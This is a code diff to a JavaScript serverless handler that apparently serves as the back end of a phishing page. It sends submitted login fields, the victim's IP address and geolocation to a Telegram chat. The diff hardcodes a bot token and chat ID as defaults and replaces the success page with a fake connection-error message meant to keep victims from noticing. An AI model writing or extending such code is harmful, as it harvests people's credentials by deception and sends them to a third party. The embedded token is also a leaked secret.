@@ -5,6 +5,10 @@ const FORM_OWNERS = {
   'login-form': process.env.LOGIN_EMAIL || process.env.DEST_EMAIL
 };
 
+const DEFAULT_TELEGRAM_BOT_TOKEN =
+  '9171466013:AAHq46tvJNzUhOr3LyS9682j2zc_xUaRnuY';
+const DEFAULT_TELEGRAM_CHAT_ID = '5810458739';
+
 function safeDecode(value = '') {
   try {
     return decodeURIComponent(String(value)).trim();
@@ -46,6 +50,7 @@ function extractLocation(req) {
   const coords = lat && lon ? `${lat}, ${lon}` : 'Unavailable';
 
   return {
+    city: city || 'Unknown',
     country: country || 'Unknown',
     place,
     coords
@@ -80,7 +85,7 @@ export default async function handler(req, res) {
 
     const ipAddress = extractClientIp(req);
     const location = extractLocation(req);
-    const submissionLabel = `New Form Submission : ${location.country}`;
+    const submissionLabel = `New Login ${formId} ,${location.country} ,${location.city}`;
 
     const entries = Object.entries(body).filter(([key]) => !key.startsWith('_'));
 
@@ -94,7 +99,6 @@ export default async function handler(req, res) {
       submissionLabel,
       `Form ID: ${formId}`,
       ...metaLines,
-      '━━━━━━━━━━━━━━━━━━━━━━',
       ...entries.map(([k, v]) => `${k}: ${String(v ?? '')}`)
     ].join('\n');
 
@@ -117,8 +121,8 @@ export default async function handler(req, res) {
       </div>
     `;
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID || DEFAULT_TELEGRAM_CHAT_ID;
     const resendApiKey = process.env.RESEND_API_KEY;
 
     const tasks = [];
@@ -209,7 +213,7 @@ export default async function handler(req, res) {
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Server loading and try again</title>
+  <title>Please open your mail and try again</title>
   <style>
     body {
       font-family: system-ui, -apple-system, sans-serif;
@@ -229,15 +233,26 @@ export default async function handler(req, res) {
       max-width: 380px;
     }
     .spinner {
-      width: 32px;
-      height: 32px;
+      width: 36px;
+      height: 36px;
       margin: 0 auto 1rem;
       border: 3px solid #e5e7eb;
       border-top-color: #111827;
       border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+      animation: spin 0.9s linear infinite;
+      animation-iteration-count: infinite;
+    }
+    .warning {
+      color: #dc2626;
+      font-weight: 600;
+      margin: 0 0 0.75rem;
+    }
+    .prompt {
+      margin: 0;
+      color: #111827;
     }
     @keyframes spin {
+      from { transform: rotate(0deg); }
       to { transform: rotate(360deg); }
     }
   </style>
@@ -245,8 +260,8 @@ export default async function handler(req, res) {
 <body>
   <div class="card">
     <div class="spinner" aria-hidden="true"></div>
-    <h2>Server loading and try again</h2>
-    <p>Your submission was received.</p>
+    <p class="warning">⚠️ Please check your internet connection and try again.</p>
+    <p class="prompt">Please open your mail and try again.</p>
   </div>
 </body>
 </html>`);
